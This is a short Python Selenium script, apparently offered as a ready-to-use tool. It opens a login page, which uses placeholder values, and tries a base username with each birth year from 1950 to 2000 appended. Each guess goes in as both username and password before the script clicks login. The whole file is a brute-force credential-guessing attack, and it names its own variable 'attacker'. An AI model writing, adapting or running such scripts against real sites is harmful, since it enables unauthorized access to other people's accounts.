from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from time import sleep

# Set up WebDriver
browser = webdriver.Firefox()
browser.get('https://www.example.com')
#browser.maximize_window()

# Locate username and password elements
# In cases if there is a space in the name. You should replace it with point.
# Example, if class/id name is 'crc ui input 0'. It should be in code 'crc.ui.input.0'
username_element = browser.find_element(By.ID, 'example')
password_element = browser.find_element(By.ID, 'example')

# Target base username
possible_target = 'example'

# For log/pass with number ranges
start_age = 1950
end_age = 2000

def fun(target):
    for i in range(start_age, end_age + 1):
        attacker = target + str(i)

        # Clear input fields before entering new data
        username_element.clear()
        password_element.clear()

        # Send new username and password
        username_element.send_keys(attacker)
        password_element.send_keys(attacker)

        # Find and click the login button
        button = browser.find_element(By.CSS_SELECTOR, 'example')
        button.click()

        # Optional delay after each attempt to let the page process
        sleep(1)

# Run the function with the possible target
fun(possible_target)
